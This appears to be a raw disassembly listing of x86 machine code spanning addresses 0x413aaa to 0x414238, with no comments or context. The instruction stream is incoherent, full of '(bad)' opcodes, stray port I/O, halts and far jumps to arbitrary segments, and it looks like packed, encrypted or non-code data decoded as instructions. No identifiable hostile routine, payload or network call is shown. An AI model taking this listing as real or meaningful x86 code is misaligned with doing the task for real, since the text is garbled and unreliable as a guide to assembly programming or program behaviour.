  413aaa:	sar    BYTE PTR [ebp+0x29fa9238],cl
  413ab0:	lods   eax,DWORD PTR ds:[esi]
  413ab1:	inc    edi
  413ab2:	popa   
  413ab3:	lock cmp BYTE PTR [eax+0x2733bc5],al
  413aba:	imul   ebx,DWORD PTR [ebx-0x5d],0x428425ab
  413ac1:	aam    0xf4
  413ac3:	mov    WORD PTR [edi+0x297e6667],ds
  413ac9:	and    BYTE PTR [edi-0xce24acf],ch
  413acf:	hlt    
  413ad0:	or     bh,bh
  413ad2:	(bad)
  413ad6:	xchg   ebp,eax
  413ad7:	loope  0x413abb
  413ad9:	jg     0x413a84
  413adb:	lods   eax,DWORD PTR ds:[esi]
  413adc:	or     BYTE PTR [ebp+ebp*1+0x26],0xbb
  413ae1:	mov    edi,0x97d352bc
  413ae6:	fcom   st(7)
  413ae8:	hlt    
  413ae9:	xchg   ecx,eax
  413aea:	aam    0xa2
  413aec:	gs dec eax
  413aee:	pop    eax
  413aef:	sbb    DWORD PTR [ecx+0x10],ebp
  413af2:	jg     0x413b54
  413af4:	je     0x413ae9
  413af6:	pusha  
  413af7:	mov    BYTE PTR [esi+0x303a5e13],al
  413afd:	test   eax,ecx
  413aff:	sub    ch,ah
  413b01:	pop    esp
  413b02:	fdivr  QWORD PTR [esp+ecx*4+0x12]
  413b06:	mov    edi,0x18cb980d
  413b0b:	lock add edi,DWORD PTR [esi+eax*4+0x5b9a840d]
  413b13:	fistp  QWORD PTR [ebx+esi*1]
  413b16:	jp     0x413ac2
  413b18:	cmp    eax,0x2c84705d
  413b1d:	cdq    
  413b1e:	rol    DWORD PTR [esi],cl
  413b20:	ds or  bh,ah
  413b23:	mov    BYTE PTR [ecx+0x2e70a67],dh
  413b29:	pusha  
  413b2a:	(bad)  
  413b2b:	sbb    DWORD PTR [esi-0x28ec03a9],ebx
  413b31:	ds ja  0x413b16
  413b34:	out    0xf8,eax
  413b36:	inc    edi
  413b37:	adc    edx,DWORD PTR [eax-0x3e4408f3]
  413b3d:	jmp    0xba3a:0xf17f9f4c
  413b44:	xlat   BYTE PTR ds:[ebx]
  413b45:	pop    ecx
  413b46:	sbb    al,0x56
  413b48:	cdq    
  413b49:	repz test eax,0x949198e1
  413b4f:	es mov ebp,0x65212db1
  413b55:	imul   edi,DWORD PTR [edi],0x17e36374
  413b5b:	adc    al,BYTE PTR [esi-0x3]
  413b5e:	out    0xe5,al
  413b60:	xchg   edx,eax
  413b61:	or     esi,esp
  413b63:	ret    
  413b64:	xchg   esi,eax
  413b65:	jo     0x413bc4
  413b67:	cmc    
  413b68:	cwde   
  413b69:	add    DWORD PTR [ebp+eax*1+0x79],ebp
  413b6d:	pop    ebp
  413b6e:	es pop edi
  413b70:	js     0x413b11
  413b72:	mov    ebp,0xa8f28ec7
  413b77:	push   cs
  413b78:	sbb    dh,BYTE PTR [eax+0x79]
  413b7b:	sbb    eax,0x939536d0
  413b80:	push   edi
  413b81:	pop    ecx
  413b82:	xchg   DWORD PTR [esp+ecx*4-0x64477d8e],esi
  413b89:	add    esi,DWORD PTR [esi]
  413b8b:	clc    
  413b8c:	dec    esp
  413b8d:	add    DWORD PTR [eax],ebp
  413b8f:	sahf   
  413b90:	mov    esi,0xb7e0db84
  413b95:	test   eax,0x1fc5f510
  413b9a:	imul   dh
  413b9c:	inc    esp
  413b9d:	fldcw  WORD PTR [esi+0x2674de92]
  413ba3:	int3   
  413ba4:	cmc    
  413ba5:	in     eax,0x37
  413ba7:	xor    eax,0xde9c08e4
  413bac:	scas   al,BYTE PTR es:[edi]
  413bad:	mov    dh,0xee
  413baf:	adc    BYTE PTR [edx-0x4d],bh
  413bb2:	retf   
  413bb3:	xor    eax,0xbcdfbc8e
  413bb8:	push   0xffffffdb
  413bba:	sub    DWORD PTR [eax-0x80],ebx
  413bbd:	fbld   TBYTE PTR [esi+0xd]
  413bc0:	mov    dl,BYTE PTR [esi+0x1]
  413bc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc4:	(bad)  
  413bc5:	das    
  413bc6:	or     al,0x11
  413bc8:	mov    dl,0xd1
  413bca:	inc    ebp
  413bcb:	stos   DWORD PTR es:[edi],eax
  413bcc:	lods   al,BYTE PTR ds:[esi]
  413bcd:	dec    edi
  413bce:	imul   ecx,edi,0xffffffd7
  413bd1:	jnp    0x413b9e
  413bd3:	inc    esi
  413bd4:	adc    dl,BYTE PTR [edx]
  413bd6:	jne    0x413bfe
  413bd8:	cmc    
  413bd9:	(bad)  
  413bda:	or     eax,0xf2f1b84b
  413bdf:	jge    0x413bcb
  413be1:	stc    
  413be2:	pop    ds
  413be3:	mov    ebx,0x797d64bb
  413be8:	xor    BYTE PTR [ebp-0x68],0x74
  413bec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bed:	fisub  WORD PTR [esi-0x75e5883d]
  413bf3:	cmp    eax,0xf35d2c75
  413bf8:	lock pop ecx
  413bfa:	dec    esp
  413bfb:	mov    bh,0xbe
  413bfd:	dec    BYTE PTR [ecx+esi*2]
  413c00:	xor    dh,BYTE PTR [ebp+0x6abb4936]
  413c06:	in     eax,0x4e
  413c08:	jg     0x413bf4
  413c0a:	add    al,0xbb
  413c0c:	imul   BYTE PTR [eax]
  413c0e:	test   eax,0x88a6bd18
  413c13:	and    ah,BYTE PTR [ecx]
  413c15:	or     al,0x17
  413c17:	mov    dh,0xe9
  413c19:	in     eax,0x9
  413c1b:	loopne 0x413c60
  413c1d:	add    al,0x7d
  413c1f:	ret    0xd8b4
  413c22:	mov    ch,BYTE PTR [esp+ebp*4+0x2af074e5]
  413c29:	adc    BYTE PTR [eax],al
  413c2b:	(bad)  
  413c2d:	retf   0x3b5a
  413c30:	mov    al,ds:0x76976a04
  413c35:	es mov eax,0x21900ee1
  413c3b:	addr16 mov al,ds:0x1b4e
  413c3f:	adc    esp,ecx
  413c41:	mov    ebp,0x7cdbcdf3
  413c46:	std    
  413c47:	cld    
  413c48:	icebp  
  413c49:	jp     0x413cb3
  413c4b:	and    dl,BYTE PTR [esi]
  413c4d:	in     ax,dx
  413c4f:	add    bl,dl
  413c51:	xchg   esi,eax
  413c52:	cmp    BYTE PTR [ecx+0x1b1a32f2],0xbe
  413c59:	push   ss
  413c5a:	push   ebx
  413c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c5c:	dec    edi
  413c5d:	das    
  413c5e:	mov    esp,0x968170fc
  413c63:	retf   0x3bad
  413c66:	push   edx
  413c67:	or     eax,0x6a5d1d94
  413c6c:	int    0xf0
  413c6e:	cld    
  413c6f:	js     0x413c83
  413c71:	sub    eax,0x41b8c380
  413c76:	dec    ebp
  413c77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c78:	or     DWORD PTR [esi],esi
  413c7a:	int    0xcf
  413c7c:	rcl    DWORD PTR [ecx],1
  413c7e:	mov    ch,BYTE PTR [ebp+0x42a842cf]
  413c84:	mov    ds:0xc0859c15,eax
  413c89:	push   ss
  413c8a:	lock (bad) 
  413c8c:	mov    dh,0x98
  413c8e:	sub    DWORD PTR [esi+0x7a55f6f3],edi
  413c94:	cwde   
  413c95:	xchg   cl,dh
  413c97:	imul   esi,DWORD PTR [edx+0x8],0x784430d3
  413c9e:	adc    DWORD PTR [edi+0x6c],edi
  413ca1:	ins    DWORD PTR es:[edi],dx
  413ca2:	outs   dx,BYTE PTR ds:[esi]
  413ca3:	shr    DWORD PTR [esi+ebx*1+0x39],cl
  413ca7:	xor    eax,0x148c5a7b
  413cac:	xor    eax,0xa9d57d8f
  413cb1:	sbb    esi,ebp
  413cb3:	ror    ecx,cl
  413cb5:	push   cs
  413cb6:	fnsave [esi+eax*2-0x38]
  413cba:	and    eax,0x6c8a956
  413cbf:	dec    ebx
  413cc0:	std    
  413cc1:	jecxz  0x413c64
  413cc3:	mov    ds:0x4f2a11ad,eax
  413cc8:	enter  0x72cc,0x60
  413ccc:	int3   
  413ccd:	jo     0x413d0b
  413ccf:	popf   
  413cd0:	push   eax
  413cd1:	xchg   edx,eax
  413cd2:	inc    ebp
  413cd3:	xor    al,0x81
  413cd5:	in     al,0x99
  413cd7:	fisttp QWORD PTR [ecx]
  413cd9:	mov    ch,0x91
  413cdb:	pop    ebp
  413cdc:	fmul   st,st(3)
  413cde:	dec    eax
  413cdf:	dec    ecx
  413ce0:	leave  
  413ce1:	out    0x16,al
  413ce3:	scas   eax,DWORD PTR es:[edi]
  413ce4:	jp     0x413cb7
  413ce6:	adc    DWORD PTR [edx],ebx
  413ce8:	sub    eax,0x1d70b1e8
  413ced:	adc    esi,edi
  413cef:	push   ds
  413cf0:	mov    BYTE PTR [ecx-0x46],dh
  413cf3:	nop
  413cf4:	enter  0xe728,0xd1
  413cf8:	mov    al,0xc5
  413cfa:	mov    eax,0xd464aafc
  413cff:	mov    ds:0x978383fd,al
  413d04:	mov    al,ds:0xefe08260
  413d09:	cmp    BYTE PTR [eax+0x1d],bh
  413d0c:	repnz ins BYTE PTR es:[edi],dx
  413d0e:	ja     0x413d7b
  413d10:	inc    ecx
  413d11:	sar    ah,cl
  413d13:	xor    eax,0x8b8e2615
  413d18:	pop    edi
  413d19:	mov    ebx,0x20e10870
  413d1e:	sbb    BYTE PTR [edx],bh
  413d20:	aad    0xda
  413d22:	out    0x7,eax
  413d24:	cmp    eax,0xc2e4e3a4
  413d29:	xchg   esi,eax
  413d2a:	add    eax,DWORD PTR [ebp+0x74]
  413d2d:	pop    ds
  413d2e:	dec    ebp
  413d2f:	clc    
  413d30:	jmp    ecx
  413d32:	xchg   ebx,eax
  413d33:	mov    ebp,0x1f3b2b16
  413d38:	retf   0x62e2
  413d3b:	icebp  
  413d3c:	jae    0x413d4c
  413d3e:	mov    edx,0xdf74e9cc
  413d43:	jne    0x413d6e
  413d45:	mov    esi,0xadf11b63
  413d4a:	frstor [edx]
  413d4c:	stos   BYTE PTR es:[edi],al
  413d4d:	push   ebx
  413d4e:	stc    
  413d4f:	sbb    eax,DWORD PTR [esp+esi*4]
  413d52:	mov    WORD PTR ds:0x18fa94c,ds
  413d58:	pop    edi
  413d59:	(bad)  
  413d5a:	sbb    cl,bh
  413d5c:	xchg   ebx,eax
  413d5d:	sbb    eax,0x3cb753e3
  413d62:	cmp    esi,DWORD PTR [ebp-0x32]
  413d65:	enter  0xba25,0x77
  413d69:	xor    dl,BYTE PTR [ecx-0x3f]
  413d6c:	jg     0x413da5
  413d6e:	jno    0x413dbc
  413d70:	fwait
  413d71:	cwde   
  413d72:	les    edx,FWORD PTR [edi-0x40e57f3b]
  413d78:	mov    bh,0x0
  413d7a:	sbb    ebp,DWORD PTR [edi-0xc]
  413d7d:	sub    esp,DWORD PTR [esi+0x18]
  413d80:	or     eax,DWORD PTR [ebp+0x3942ee1b]
  413d86:	pop    es
  413d87:	add    eax,0xf8b427ee
  413d8c:	sar    ah,0xa5
  413d8f:	dec    eax
  413d90:	test   BYTE PTR [eax],dh
  413d92:	in     al,0x65
  413d94:	out    0x82,eax
  413d96:	sbb    cl,BYTE PTR [ebx+0x539fc0b6]
  413d9c:	xchg   BYTE PTR [ecx],dl
  413d9e:	(bad)  
  413d9f:	aaa    
  413da0:	push   ecx
  413da1:	dec    eax
  413da2:	ja     0x413e23
  413da4:	fidivr WORD PTR [ebp+0x7]
  413da7:	add    eax,0x6a11e4ef
  413dac:	shl    ah,0xf8
  413daf:	sbb    al,0x9d
  413db1:	outs   dx,DWORD PTR ds:[esi]
  413db2:	ret    
  413db3:	mov    eax,0x32bda7f7
  413db8:	xchg   bp,ax
  413dba:	jecxz  0x413d7d
  413dbc:	outs   dx,BYTE PTR ds:[esi]
  413dbd:	shl    BYTE PTR [ebx-0x46],0x43
  413dc1:	int    0x20
  413dc3:	xor    eax,0x80d2c1db
  413dc8:	loop   0x413e0e
  413dca:	pop    esp
  413dcb:	fwait
  413dcc:	lods   eax,DWORD PTR ds:[esi]
  413dcd:	cmp    DWORD PTR [edi-0x105eabdc],esp
  413dd3:	sbb    ecx,eax
  413dd5:	pop    eax
  413dd6:	pop    ecx
  413dd7:	jge    0x413db5
  413dd9:	jmp    0xc7225057
  413dde:	scas   eax,DWORD PTR es:[edi]
  413ddf:	outs   dx,BYTE PTR ds:[esi]
  413de0:	lods   al,BYTE PTR ds:[esi]
  413de1:	push   0x6b
  413de3:	sahf   
  413de4:	mov    ?,WORD PTR [ecx+edi*2-0x7a5f16a2]
  413deb:	mov    esp,0xedc745e8
  413df0:	lods   eax,DWORD PTR ds:[esi]
  413df1:	cmp    ebp,DWORD PTR [edi+ebp*4]
  413df4:	adc    BYTE PTR [edx+0x4c],dl
  413df7:	push   ecx
  413df8:	cld    
  413df9:	xchg   edi,eax
  413dfa:	stos   DWORD PTR es:[edi],eax
  413dfb:	or     eax,0x37767152
  413e00:	hlt    
  413e01:	inc    ecx
  413e02:	pop    es
  413e03:	or     edi,DWORD PTR [eax+0x78]
  413e06:	sub    al,BYTE PTR [esp+edi*8]
  413e09:	cmp    ecx,DWORD PTR [ebx+0x18a2b68f]
  413e0f:	cmp    ecx,DWORD PTR [eax+0x4e60673e]
  413e15:	fst    DWORD PTR [edi+edx*1+0x2f]
  413e19:	fldenv [edx-0xc]
  413e1c:	imul   esi,eax,0x92a6930e
  413e22:	fwait
  413e23:	and    esp,DWORD PTR [ecx]
  413e25:	call   0x773a:0xe23528df
  413e2c:	aam    0x41
  413e2e:	dec    esp
  413e2f:	inc    esi
  413e30:	jmp    FWORD PTR [eax]
  413e32:	xchg   DWORD PTR [esp+eiz*2],edx
  413e35:	in     al,dx
  413e36:	mov    dh,0x50
  413e38:	ins    DWORD PTR es:[edi],dx
  413e39:	mov    BYTE PTR [eax+0x3b1d798d],dh
  413e3f:	scas   eax,DWORD PTR es:[edi]
  413e40:	jae    0x413e83
  413e42:	lds    edi,FWORD PTR ds:0x63e06c8d
  413e48:	data16 jno 0x413e9a
  413e4b:	call   0xbc21:0xe6b2db3f
  413e52:	sti    
  413e53:	pushf  
  413e54:	stc    
  413e55:	mov    esp,DWORD PTR [ecx+0x6d]
  413e58:	cld    
  413e59:	js     0x413ea6
  413e5b:	shl    DWORD PTR [ebp-0x6],0x97
  413e5f:	retf   
  413e60:	jl     0x413ec5
  413e62:	aaa    
  413e63:	or     edi,DWORD PTR ds:0x35fdcb64
  413e6a:	sub    DWORD PTR [ebx+eax*2-0x54],ebp
  413e6e:	inc    ebx
  413e6f:	ror    BYTE PTR [esi-0x7189a69b],1
  413e75:	pop    edx
  413e76:	outs   dx,DWORD PTR ds:[esi]
  413e77:	xchg   esi,eax
  413e78:	retf   0xa776
  413e7b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  413e7d:	inc    edi
  413e7e:	fst    DWORD PTR [ebx+ebx*1+0x55]
  413e82:	mov    BYTE PTR [esi-0x13],bh
  413e85:	and    BYTE PTR [ebx+0x18],ah
  413e88:	add    dl,ah
  413e8a:	mov    ds:0xdb341d28,al
  413e8f:	fnsave [ebx]
  413e91:	rcpps  xmm2,xmm6
  413e94:	adc    al,BYTE PTR [ebx-0x14]
  413e97:	repnz xor ch,BYTE PTR [ebp+edi*8+0x6b]
  413e9c:	nop
  413e9d:	mov    ah,0x3b
  413e9f:	sub    eax,0xdbcdbd37
  413ea4:	repz mov al,ds:0x591c504a
  413eaa:	mov    al,ds:0xb32772e8
  413eaf:	or     BYTE PTR [esi],bh
  413eb1:	fisub  WORD PTR [esi-0xb104f6a]
  413eb7:	add    al,0x6e
  413eb9:	sub    ebx,DWORD PTR [ebx-0x2b]
  413ebc:	add    al,0xb3
  413ebe:	add    bh,dh
  413ec0:	xor    al,0xa8
  413ec2:	fucompp 
  413ec4:	(bad)  
  413ec5:	push   esi
  413ec6:	fwait
  413ec7:	je     0x413f07
  413ec9:	sbb    dh,BYTE PTR [ebp+eax*8-0x4b]
  413ecd:	jmp    0x59f66a8e
  413ed2:	cmp    eax,0xd01f731d
  413ed7:	rol    BYTE PTR [edi+0x2e383f67],0x5c
  413ede:	jmp    DWORD PTR [ecx-0x52ac9424]
  413ee4:	sbb    ch,cl
  413ee6:	mov    edi,0xe89750fa
  413eeb:	call   0xdea0a80c
  413ef0:	sbb    DWORD PTR [edi],ecx
  413ef2:	sbb    eax,0x80cc607e
  413ef7:	retf   
  413ef8:	cmp    DWORD PTR [esi],0xffffffd8
  413efb:	mov    ds:0xaba67e13,al
  413f00:	lds    edx,FWORD PTR [ebp+0xf]
  413f03:	cmp    eax,0xa99a494f
  413f08:	stc    
  413f09:	faddp  st(7),st
  413f0b:	pop    edx
  413f0c:	pop    ebp
  413f0d:	js     0x413f2d
  413f0f:	(bad)  
  413f11:	popa   
  413f12:	js     0x413f3a
  413f14:	ds push ebx
  413f16:	add    BYTE PTR [edx+eax*4-0x2c0b3e5f],ah
  413f1d:	lods   eax,DWORD PTR ds:[esi]
  413f1e:	popf   
  413f1f:	sub    eax,0xa30c914a
  413f24:	jecxz  0x413fa1
  413f26:	fs lods ax,WORD PTR ss:[esi]
  413f2a:	mov    ebp,0x5fd960f
  413f2f:	inc    ebp
  413f30:	daa    
  413f31:	aas    
  413f32:	rcl    bh,1
  413f34:	add    esp,DWORD PTR [edi-0x7b]
  413f37:	sub    DWORD PTR [ebp+0x45],edi
  413f3a:	add    cl,BYTE PTR [edx+0xb]
  413f3d:	or     cl,BYTE PTR [ebx]
  413f3f:	jg     0x413f03
  413f41:	or     BYTE PTR [ebp+0x21c789a0],0xf7
  413f48:	inc    esi
  413f49:	leave  
  413f4a:	lds    eax,FWORD PTR [edi+0x46]
  413f4d:	iret   
  413f4e:	push   edx
  413f4f:	loopne 0x413ede
  413f51:	or     eax,DWORD PTR [edx+eiz*8]
  413f54:	jl     0x413f6a
  413f56:	fwait
  413f57:	mov    dl,0x48
  413f59:	scas   eax,DWORD PTR es:[edi]
  413f5a:	(bad)  
  413f5b:	ja     0x413fb2
  413f5d:	push   ecx
  413f5e:	jle    0x413fba
  413f60:	adc    cl,dh
  413f62:	gs jge 0x413f24
  413f65:	lock mov WORD PTR [eax+0x57],gs
  413f69:	cld    
  413f6a:	je     0x413fbf
  413f6c:	pop    eax
  413f6d:	cmp    al,0x40
  413f6f:	adc    al,0xc7
  413f71:	and    DWORD PTR [edx],ebp
  413f73:	mov    al,0x6a
  413f75:	outs   dx,DWORD PTR ds:[esi]
  413f76:	push   ss
  413f77:	bound  ebx,QWORD PTR [ecx]
  413f79:	jo     0x413fa3
  413f7b:	(bad)  
  413f7c:	or     eax,esp
  413f7e:	aad    0x64
  413f80:	or     DWORD PTR [edi+0x11],0x749f24bb
  413f87:	into   
  413f88:	jne    0x413fa9
  413f8a:	repz pop ecx
  413f8c:	in     eax,0xad
  413f8e:	jne    0x413fee
  413f90:	push   ss
  413f91:	adc    dl,BYTE PTR [ebp+0x678b1003]
  413f97:	and    al,0x18
  413f99:	or     cl,ch
  413f9b:	fidivr DWORD PTR [ebx+ecx*8-0x5baf1c11]
  413fa2:	popa   
  413fa3:	mov    ah,0xd8
  413fa5:	shl    BYTE PTR [edx-0x2433994e],cl
  413fab:	fnstcw WORD PTR [ebx+0x3f]
  413fae:	sub    ecx,DWORD PTR [eax+0xaf3e921]
  413fb4:	mov    cs:0x4861e1e0,eax
  413fba:	dec    ebx
  413fbb:	sbb    eax,0xad8ec927
  413fc0:	outs   dx,BYTE PTR ds:[esi]
  413fc1:	test   DWORD PTR [edx],0xac920d7
  413fc7:	(bad)  
  413fc8:	dec    eax
  413fc9:	loopne 0x413f96
  413fcb:	stos   BYTE PTR es:[edi],al
  413fcc:	out    0xa0,al
  413fce:	cmc    
  413fcf:	jae    0x413f5e
  413fd1:	call   0x51c2:0x481f5bbc
  413fd8:	fwait
  413fd9:	xor    eax,0xce33da80
  413fde:	aas    
  413fdf:	das    
  413fe0:	or     bh,BYTE PTR [edi-0x4e]
  413fe3:	arpl   WORD PTR [edi],ax
  413fe5:	xchg   edi,eax
  413fe6:	xchg   esi,eax
  413fe7:	mov    ah,0xfd
  413fe9:	mov    ds:0xa023c213,al
  413fee:	mov    eax,ds:0x8acae75b
  413ff3:	scas   eax,DWORD PTR es:[edi]
  413ff4:	xchg   edi,eax
  413ff5:	cld    
  413ff6:	test   BYTE PTR [eax+eiz*4+0xa],bh
  413ffa:	mov    bh,0x12
  413ffc:	push   edi
  413ffd:	sbb    al,0x64
  413fff:	push   0x50
  414001:	stos   BYTE PTR es:[edi],al
  414002:	inc    edi
  414003:	imul   edi,DWORD PTR [esi+esi*4],0xffffff82
  414007:	sbb    BYTE PTR ds:0xf79b39a8,al
  41400d:	sbb    bl,BYTE PTR [edx+0x30]
  414010:	jmp    0xb34c:0x26af2df1
  414017:	shl    BYTE PTR [ecx],cl
  414019:	sahf   
  41401a:	fcom   QWORD PTR [edi+0xc241729]
  414020:	pop    esi
  414021:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414022:	jbe    0x413fbc
  414024:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414025:	test   eax,0x913417e8
  41402a:	scas   eax,DWORD PTR es:[edi]
  41402b:	mov    al,ds:0xabf0d17
  414030:	add    eax,0xeb55bbcb
  414035:	push   0x27c9629f
  41403a:	xchg   ebp,eax
  41403b:	jbe    0x413ff2
  41403d:	xchg   esi,eax
  41403e:	call   0x6f93719c
  414043:	xor    BYTE PTR [ebp+eiz*1-0x35ca4d6e],0x73
  41404b:	xchg   esp,eax
  41404c:	shr    ebx,0xf5
  41404f:	add    dl,BYTE PTR [edi-0x40f0a1d6]
  414055:	xchg   edi,eax
  414056:	mov    edx,0xf5436877
  41405b:	shl    DWORD PTR [ebp-0x50],0xa
  41405f:	sbb    DWORD PTR [edi+0x580e01d1],edi
  414065:	aas    
  414066:	(bad)  
  414067:	and    BYTE PTR [ebx-0x1a],al
  41406a:	outs   dx,DWORD PTR ds:[esi]
  41406b:	cdq    
  41406c:	out    dx,al
  41406d:	dec    ebx
  41406e:	add    DWORD PTR ds:0x62bfafcd,ebp
  414074:	add    cl,BYTE PTR [edx+ebx*4]
  414077:	jg     0x414003
  414079:	push   esi
  41407a:	stos   DWORD PTR es:[edi],eax
  41407b:	and    al,0xbc
  41407d:	fwait
  41407e:	(bad)  
  41407f:	mov    bh,0xdb
  414081:	pop    edx
  414082:	mov    ds:0xd7b87f9a,eax
  414087:	xchg   edi,eax
  414088:	test   eax,0x75e0d0d4
  41408d:	xlat   BYTE PTR ds:[ebx]
  41408e:	jae    0x41408b
  414090:	in     eax,dx
  414091:	shl    DWORD PTR [eax+0x40],1
  414094:	cwde   
  414095:	cld    
  414096:	add    ch,BYTE PTR ss:[esi+0x7d]
  41409a:	fst    QWORD PTR cs:[esi]
  41409d:	push   esp
  41409e:	dec    edi
  41409f:	mov    ebp,DWORD PTR [ebx]
  4140a1:	xchg   ebx,eax
  4140a2:	retf   0x1d9d
  4140a5:	xchg   ebp,eax
  4140a6:	or     BYTE PTR [esi+0x5f],0xb2
  4140aa:	push   esp
  4140ab:	js     0x41411e
  4140ad:	pop    ecx
  4140ae:	dec    eax
  4140af:	mov    ah,0xe5
  4140b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140b2:	ins    BYTE PTR es:[edi],dx
  4140b3:	xor    eax,0xc4d14398
  4140b8:	sub    ebx,edx
  4140ba:	xor    BYTE PTR [edi],dh
  4140bc:	imul   esi,edx,0x5
  4140bf:	xchg   edx,eax
  4140c0:	dec    ebx
  4140c1:	adc    al,0xbb
  4140c3:	leave  
  4140c4:	pop    esi
  4140c5:	and    eax,0xc22e973f
  4140ca:	push   ecx
  4140cb:	xchg   ecx,eax
  4140cc:	dec    edi
  4140cd:	sti    
  4140ce:	jmp    0x76e1:0xb708a226
  4140d5:	xor    BYTE PTR [esi-0x2b12e814],dl
  4140db:	stos   DWORD PTR es:[edi],eax
  4140dc:	jmp    esp
  4140de:	xchg   DWORD PTR [ebx+0x2d],edi
  4140e1:	mov    edx,0xe89410d6
  4140e6:	scas   al,BYTE PTR es:[edi]
  4140e7:	lods   al,BYTE PTR ds:[esi]
  4140e8:	jne    0x4140d5
  4140ea:	push   esp
  4140eb:	pop    eax
  4140ec:	jge    0x414129
  4140ee:	int3   
  4140ef:	and    bh,BYTE PTR [ebx-0x7c]
  4140f2:	push   es
  4140f3:	cs or  eax,0x3e54acf4
  4140f9:	mov    al,ds:0xa0455ad0
  4140fe:	pop    esi
  4140ff:	dec    edx
  414100:	xchg   DWORD PTR [esi],esi
  414102:	or     DWORD PTR [edx+ebx*1+0xf],esp
  414106:	cmc    
  414107:	or     BYTE PTR [ebx-0x4a],dl
  41410a:	je     0x414130
  41410c:	imul   esp,DWORD PTR [ebp+ebp*4+0x4dc286d0],0x20
  414114:	mov    ah,0x98
  414116:	add    eax,0xff7c38e6
  41411b:	ret    
  41411c:	ja     0x414164
  41411e:	sti    
  41411f:	cmc    
  414120:	loop   0x414131
  414122:	jne    0x414195
  414124:	sub    ecx,DWORD PTR [ecx]
  414126:	push   esp
  414127:	and    eax,eax
  414129:	inc    esp
  41412a:	sbb    edx,0x13
  41412d:	mov    ebx,esp
  41412f:	inc    ebx
  414130:	inc    esi
  414131:	adc    eax,0xa1fbe630
  414136:	mov    eax,ds:0xa97452dc
  41413b:	stos   DWORD PTR es:[edi],eax
  41413c:	out    dx,al
  41413d:	mov    esi,0x8bd62e9a
  414142:	and    eax,0x902977c9
  414147:	daa    
  414148:	adc    BYTE PTR [eax],0x54
  41414b:	sahf   
  41414c:	inc    ebp
  41414d:	leave  
  41414e:	cld    
  41414f:	mov    ds:0x6a361f60,eax
  414154:	cmp    al,0xbd
  414156:	inc    ebx
  414157:	adc    DWORD PTR [edx-0x5f3c5592],esi
  41415d:	mov    esp,ecx
  41415f:	or     esi,DWORD PTR [edi]
  414161:	pop    esp
  414162:	add    eax,0xcaed0646
  414167:	cmp    eax,0x1d60dbe0
  41416c:	push   esi
  41416d:	dec    edi
  41416e:	fwait
  41416f:	adc    cl,BYTE PTR [eax]
  414171:	(bad)  
  414172:	mov    bl,0x99
  414174:	sbb    BYTE PTR [eax+ecx*2],bh
  414177:	mov    dl,0x54
  414179:	sbb    BYTE PTR [esi],ah
  41417b:	stc    
  41417c:	push   esi
  41417d:	push   esp
  41417e:	ret    
  41417f:	xor    DWORD PTR [ecx],esp
  414181:	mov    DWORD PTR [edi+eax*2+0x42],edx
  414185:	pop    ss
  414186:	pop    eax
  414187:	jns    0x4141da
  414189:	in     eax,dx
  41418a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41418b:	mov    ah,0xd9
  41418d:	mov    ds:0xdf6b6346,eax
  414192:	stos   BYTE PTR es:[edi],al
  414193:	xlat   BYTE PTR ds:[ebx]
  414194:	cmp    edx,DWORD PTR [ebp+0xa]
  414197:	out    dx,eax
  414198:	lock test al,dh
  41419b:	pop    edx
  41419c:	in     eax,dx
  41419d:	outs   dx,DWORD PTR ds:[esi]
  41419e:	mov    ds:0x21a1d1f3,al
  4141a3:	push   0x27
  4141a5:	shl    DWORD PTR [ebx],1
  4141a7:	mov    al,BYTE PTR [esi]
  4141a9:	aam    0xb8
  4141ab:	jae    0x414140
  4141ad:	clc    
  4141ae:	fs addr16 ret 0xa1bf
  4141b3:	jg     0x4141f1
  4141b5:	nop
  4141b6:	cdq    
  4141b7:	inc    esp
  4141b8:	inc    esp
  4141b9:	mov    eax,ds:0xee8a798b
  4141be:	imul   edx,ecx,0x67
  4141c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4141c2:	jmp    0xd0e62d84
  4141c7:	(bad)  
  4141c8:	xchg   ebx,eax
  4141c9:	mov    BYTE PTR [ebx],bh
  4141cb:	mov    esp,0xe3a1c072
  4141d0:	rol    dl,1
  4141d2:	xchg   esi,eax
  4141d3:	repz xlat BYTE PTR ds:[ebx]
  4141d5:	xor    BYTE PTR [eax],cl
  4141d7:	xlat   BYTE PTR ds:[ebx]
  4141d8:	leave  
  4141d9:	out    0x40,al
  4141db:	xchg   edi,eax
  4141dc:	ja     0x414218
  4141de:	test   al,0xdf
  4141e0:	push   ss
  4141e1:	idiv   DWORD PTR [ecx+0x1]
  4141e4:	dec    esi
  4141e5:	jg     0x4141f2
  4141e7:	xchg   esi,eax
  4141e8:	xchg   ebp,eax
  4141e9:	dec    ebx
  4141ea:	xor    dh,BYTE PTR [ebp+0x72]
  4141ed:	int3   
  4141ee:	adc    ecx,DWORD PTR [edx]
  4141f0:	das    
  4141f1:	(bad)  
  4141f2:	xchg   esp,eax
  4141f3:	(bad)  
  4141f4:	jmp    0xbb63d528
  4141f9:	out    0x27,al
  4141fb:	outs   dx,DWORD PTR ds:[esi]
  4141fc:	jecxz  0x414234
  4141fe:	inc    ebp
  4141ff:	dec    ecx
  414200:	(bad)  
  414202:	in     eax,dx
  414203:	fiadd  WORD PTR [ebx+0x4af0d975]
  414209:	fld    DWORD PTR [edx+edi*1]
  41420c:	and    BYTE PTR [edi+ebp*4],0xd9
  414210:	and    al,0x1e
  414212:	xchg   edi,eax
  414213:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414214:	add    al,0xa3
  414216:	scas   al,BYTE PTR es:[edi]
  414217:	int3   
  414218:	inc    esi
  414219:	fcomp  st(4)
  41421b:	mov    dl,0xce
  41421d:	xchg   ecx,eax
  41421e:	adc    al,0xe9
  414220:	adc    esp,0x37d896ba
  414226:	or     esi,DWORD PTR ds:0x19405f81
  41422c:	inc    edi
  41422d:	sbb    al,0x38
  41422f:	aad    0xb0
  414231:	jmp    0x414272
  414233:	retf   
  414234:	sbb    ch,BYTE PTR [ebp-0x7e]
  414237:	(bad)  
  414238:	in     al,dx
